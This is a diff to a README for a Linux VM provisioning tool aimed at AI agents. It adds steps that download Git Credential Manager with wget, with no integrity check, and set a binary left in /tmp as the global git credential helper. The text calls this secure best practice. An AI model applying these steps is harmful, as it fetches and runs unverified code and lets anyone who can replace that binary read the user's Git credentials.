@@ -38,6 +38,7 @@ If you are an AI agent (Claude, Gemini, etc.) tasked with provisioning Linux VMs
 - **Verification Commands:** Every step includes verification commands with expected outputs
 - **Decision Trees:** Comprehensive troubleshooting procedures for autonomous error resolution
 - **Multi-Agent Compatibility:** Works seamlessly with Claude Code, Gemini, Copilot, Cursor, Cline, Opencode, and Hermes
+- **Secure Credential Management:** Integrated Git Credential Manager (GCM) support for secure credential handling on the same system where AI agents operate
 
 ### AI Agent Compatibility
 
@@ -52,6 +53,33 @@ If you are an AI agent (Claude, Gemini, etc.) tasked with provisioning Linux VMs
 | **Hermes** | ✅ Native | ✅ Native | ⚠️ Needs WSL terminal |
 
 All agents use the same underlying ssh-mcp protocol with standardized configuration templates.
+
+### Git Credential Manager Integration
+
+For enhanced security, the Linus Deployment Specialist now supports Git Credential Manager (GCM) for secure credential handling:
+
+1. **Install GCM**: 
+   ```bash
+   # Download and install GCM
+   cd /tmp && mkdir gcm-install && cd gcm-install
+   wget https://github.com/git-ecosystem/git-credential-manager/releases/download/v2.7.3/gcm-linux-x64-2.7.3.tar.gz
+   tar -xzf gcm-linux-x64-2.7.3.tar.gz
+   chmod +x git-credential-manager
+   ```
+
+2. **Configure GCM as default credential helper**:
+   ```bash
+   # Configure GCM for Git
+   git config --global credential.helper /tmp/gcm-install/git-credential-manager
+   ```
+
+3. **Verify installation**: 
+   ```bash
+   git config --global credential.helper
+   # Should output: /tmp/gcm-install/git-credential-manager
+   ```
+
+This integration ensures secure storage of Git credentials on the same system where the AI agent operates, following security best practices for cross-platform Git credential handling.
 
 <details>
 <summary><b>Why doesn't Windows work natively?</b></summary>
